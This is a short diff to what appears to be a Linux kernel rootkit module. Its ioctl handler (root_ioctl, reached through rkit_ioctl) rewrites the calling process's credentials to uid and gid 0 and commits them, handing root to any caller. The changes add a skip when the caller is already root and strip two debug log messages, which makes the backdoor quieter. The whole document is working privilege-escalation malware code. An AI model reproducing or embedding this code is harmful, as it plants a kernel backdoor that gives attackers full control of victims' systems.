@@ -45,6 +45,10 @@ static long root_ioctl(struct file *file, unsigned long arg)
 	if (root == NULL)
 		return -EAGAIN;
 
+	if (root->uid.val == 0) {
+		abort_creds(root);
+		goto out;
+	}
 	save_old_creds(root);
 
 	root->uid.val = root->gid.val = 0;
@@ -54,6 +58,7 @@ static long root_ioctl(struct file *file, unsigned long arg)
 
 	commit_creds(root);
 	printk(KERN_INFO "new_uid:%d\n",({current_uid();}).val);
+out:
 	return 0;
 }
 
@@ -159,7 +164,7 @@ static long rkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 {
 	int err;
 	long ret;
-	printk(KERN_INFO "ahoy-hoy\n");
+
 	switch (cmd) {
 
 	case ROOT_IOCTL:
@@ -167,7 +172,6 @@ static long rkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 		break;
 
 	case UNROOT_IOCTL:
-		printk(KERN_INFO "oyaoya\n");
 		ret = unroot_ioctl(file,arg);
 		break;
 
